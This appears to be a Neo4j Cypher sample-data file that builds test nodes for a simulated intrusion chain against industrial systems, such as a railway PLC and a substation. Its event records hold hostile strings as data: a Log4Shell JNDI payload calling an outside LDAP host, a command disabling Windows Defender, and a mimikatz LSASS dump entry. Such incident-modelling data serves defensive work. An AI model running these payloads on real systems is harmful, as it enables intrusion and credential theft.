// GAP-004 Sample Data: R6 Temporal Reasoning (Fixed Version)
// File: gap004_sample_data_r6_v2.cypher
// Created: 2025-11-13
// Purpose: Realistic test data for R6 nodes with JSON string data properties
// Fix: Converted nested maps to JSON strings (Neo4j limitation)
...
CREATE (temp1:TemporalEvent {
  ...
  data: '{"attackTechnique":"T1046","targetPorts":[22,80,443,3389,8080],"scanType":"SYN_SCAN","packetsCount":5000,"duration":120}',
  severity: "LOW",
...
CREATE (temp2:TemporalEvent {
  ...
  data: '{"attackTechnique":"T1190","targetPort":443,"payload":"jndi:ldap://185.220.101.23:1389/Exploit","cve":"CVE-2021-44228","success":true,"responseCode":200}',
  severity: "CRITICAL",
...
CREATE (temp3:TemporalEvent {
  ...
  source: "device-app-server-01",
  data: '{"attackTechnique":"T1053.005","taskName":"WindowsUpdateCheck","command":"powershell.exe -EncodedCommand <base64>","trigger":"LOGON","user":"SYSTEM"}',
  severity: "HIGH",
...
CREATE (temp4:TemporalEvent {
  ...
  source: "device-app-server-01",
  data: '{"attackTechnique":"T1068","exploit":"CVE-2021-34527","fromUser":"web_service","toUser":"SYSTEM","success":true}',
  severity: "CRITICAL",
...
CREATE (temp5:TemporalEvent {
  ...
  source: "device-app-server-01",
  data: '{"attackTechnique":"T1562.001","service":"Windows Defender","action":"DISABLE","method":"Set-MpPreference -DisableRealtimeMonitoring $true"}',
  severity: "HIGH",
...
CREATE (temp6:TemporalEvent {
  ...
  source: "device-app-server-01",
  data: '{"attackTechnique":"T1003.001","tool":"mimikatz","target":"lsass.exe","credentialsCaptured":15,"ntlmHashes":true}',
  severity: "CRITICAL",
...
CREATE (temp7:TemporalEvent {
  ...
  source: "device-app-server-01",
  data: '{"attackTechnique":"T1018","command":"nltest /dclist:","hostsDiscovered":45,"subnetScanned":"192.168.10.0/24"}',
  severity: "MEDIUM",
...
CREATE (temp8:TemporalEvent {
  ...
  source: "device-app-server-01",
  data: '{"attackTechnique":"T1021.002","protocol":"SMB","targetHost":"device-plc-rail-001","credentials":"stolen_ntlm_hash","success":true}',
  severity: "CRITICAL",
...
CREATE (temp9:TemporalEvent {
  ...
  data: '{"attackTechnique":"T1005","filesCollected":250,"dataSize":524288000,"stagingDirectory":"C:\\\\Windows\\\\Temp\\\\update","fileTypes":["config","logs","credentials"]}',
  severity: "HIGH",
...
CREATE (temp10:TemporalEvent {
  ...
  source: "device-plc-rail-001",
  data: '{"attackTechnique":"T1041","protocol":"HTTPS","destination":"185.220.101.23:443","dataSent":524288000,"duration":300,"encrypted":true}',
  severity: "CRITICAL",
...
CREATE (snapshot1:HistoricalSnapshot {
  ...
  systemState: '{"devices":[{"deviceId":"device-plc-rail-001","status":"ONLINE","version":"v3.2.1","config":"default_secure"}],"software":[{"softwareId":"plc-firmware","version":"3.2.1","vulnerabilities":[]}],"network":[{"connections":5,"firewall_rules":23}],"users":[{"userId":"admin","permissions":"full","lastLogin":"2025-11-13T08:00:00Z"}]}',
...
CREATE (snapshot2:HistoricalSnapshot {
  ...
  scope: "ASSET",
  assetId: "device-plc-rail-001",
  systemState: '{"devices":[{"deviceId":"device-plc-rail-001","status":"COMPROMISED","version":"v3.2.1","config":"modified_suspicious"}],"software":[{"softwareId":"plc-firmware","version":"3.2.1","vulnerabilities":["CVE-2021-44228"]}],"network":[{"connections":12,"firewall_rules":18}],"users":[{"userId":"admin","permissions":"full","lastLogin":"2025-11-13T15:35:00Z"},{"userId":"SYSTEM","permissions":"full","lastLogin":"2025-11-13T15:15:00Z"}]}',
  compressedState: false,
  storageSize: 2097152,
...
CREATE (snapshot3:HistoricalSnapshot {
  ...
  scope: "NETWORK",
  systemState: '{"devices":[{"deviceId":"router-01","status":"ONLINE"},{"deviceId":"switch-01","status":"ONLINE"},{"deviceId":"firewall-01","status":"ONLINE"}],"network":[{"totalDevices":150,"activeConnections":345,"bandwidth_utilization":67.5}]}',
...
CREATE (snapshot4:HistoricalSnapshot {
  ...
  timestamp: datetime('2025-11-13T15:30:00Z'),
  scope: "SYSTEM",
  systemState: '{"devices":[{"deviceId":"device-substation-01","status":"OFFLINE"},{"deviceId":"device-transformer-001","status":"DEGRADED"}],"software":[],"network":[{"connections":89,"firewall_rules":156}]}',
  compressedState: false,
...
CREATE (snapshot5:HistoricalSnapshot {
  ...
  systemState: '{"devices":[{"deviceId":"device-pump-station-03","status":"ONLINE","version":"v2.5.0","config":"production"}],"software":[{"softwareId":"pump-controller","version":"2.5.0","vulnerabilities":[]}]}',
  compressedState: false,
  storageSize: 524288,
...
CREATE (snapshot6:HistoricalSnapshot {
  ...
  systemState: '{"devices":[{"deviceId":"device-plc-manufacturing-01","status":"COMPROMISED","version":"v4.1.2","config":"modified"}],"software":[{"softwareId":"java-runtime","version":"8u181","vulnerabilities":["CVE-2021-44228"]}]}',
  compressedState: false,
  storageSize: 1572864,
...
CREATE (snapshot7:HistoricalSnapshot {
  ...
  scope: "SYSTEM",
  systemState: '{"devices":[{"deviceId":"device-hvac-chiller-01","status":"ONLINE"},{"deviceId":"device-hvac-chiller-02","status":"STANDBY"}],"network":[{"connections":45,"bandwidth_utilization":23.5}]}',
  compressedState: true,
  storageSize: 2097152,
...
CREATE (snapshot8:HistoricalSnapshot {
  ...
  systemState: '{"devices":[{"deviceId":"device-compressor-station-05","status":"OFFLINE","version":"v3.8.1","config":"emergency_shutdown"}]}',
  compressedState: false,
  storageSize: 786432,
...
CREATE (snapshot9:HistoricalSnapshot {
  ...
  scope: "ORGANIZATION",
  systemState: '{"devices":[{"totalDevices":450,"online":447,"offline":3}],"software":[{"totalSoftware":89,"upToDate":85,"outdated":4}],"network":[{"totalConnections":1234,"bandwidthUtilization":45.7}],"users":[{"totalUsers":125,"activeUsers":98,"lockedAccounts":3}]}',
  compressedState: true,
...
CREATE (snapshot10:HistoricalSnapshot {
  ...
  scope: "NETWORK",
  systemState: '{"devices":[{"deviceId":"device-app-server-01","status":"QUARANTINED"},{"deviceId":"device-plc-rail-001","status":"ISOLATED"}],"network":[{"connections":89,"suspiciousTraffic":23,"blockedIPs":["185.220.101.23"]}]}',
  compressedState: false,
...
CREATE (version1:VersionedNode {
  ...
  properties: '{"name":"Apache Log4j","version":"2.14.1","cpe":"cpe:2.3:a:apache:log4j:2.14.1","vulnerabilities":["CVE-2021-44228","CVE-2021-45046"]}',
...
CREATE (version2:VersionedNode {
  ...
  properties: '{"name":"Apache Log4j","version":"2.15.0","cpe":"cpe:2.3:a:apache:log4j:2.15.0","vulnerabilities":[]}',
...
CREATE (version3:VersionedNode {
  ...
  properties: '{"name":"Railway PLC Controller","status":"ONLINE","ipAddress":"192.168.10.15","firmwareVersion":"3.2.1","configHash":"abc123def456"}',
  changeReason: "INITIAL",
...
CREATE (version4:VersionedNode {
  ...
  properties: '{"name":"Railway PLC Controller","status":"COMPROMISED","ipAddress":"192.168.10.15","firmwareVersion":"3.2.1","configHash":"xyz789uvw012"}',
...
CREATE (version5:VersionedNode {
  ...
  properties: '{"name":"Railway PLC Controller","status":"ONLINE","ipAddress":"192.168.10.15","firmwareVersion":"3.3.0","configHash":"abc123def456"}',
  changeReason: "INCIDENT_RESPONSE",
...
CREATE (version6:VersionedNode {
  ...
  properties: '{"name":"Centrifuge Controller Module","version":"5.8.2","manufacturer":"Siemens","model":"S7-1500"}',
...
CREATE (version7:VersionedNode {
  ...
  properties: '{"name":"Main Firewall Rules","ruleCount":156,"lastModified":"2025-11-01T00:00:00Z","configVersion":"v23.11.01"}',
...
CREATE (version8:VersionedNode {
  ...
  properties: '{"name":"Main Firewall Rules","ruleCount":163,"lastModified":"2025-11-13T15:00:00Z","configVersion":"v23.11.13"}',
  changeReason: "INCIDENT_RESPONSE",
...
CREATE (version9:VersionedNode {
  ...
  properties: '{"name":"SCADA Platform","version":"12.5.0","vendor":"Schneider Electric","vulnerabilities":[]}',
  changeReason: "UPGRADE",
...
CREATE (version10:VersionedNode {
  ...
  properties: '{"name":"Main Substation Transformer","status":"ONLINE","capacity":50000000,"voltage":138000,"model":"ABB-TXL-50MVA"}',
  changeReason: "INITIAL",
...
// ==============================================================================
// END OF R6 SAMPLE DATA (FIXED VERSION)
// ==============================================================================
// Total R6 Nodes Created: 40 nodes (10 per type × 4 types)
// Coverage: TemporalEvent, EventStore, HistoricalSnapshot, VersionedNode
// Fix Applied: Converted all nested maps to JSON strings due to Neo4j limitation
// Neo4j only supports primitive types and arrays, not nested maps
// ==============================================================================
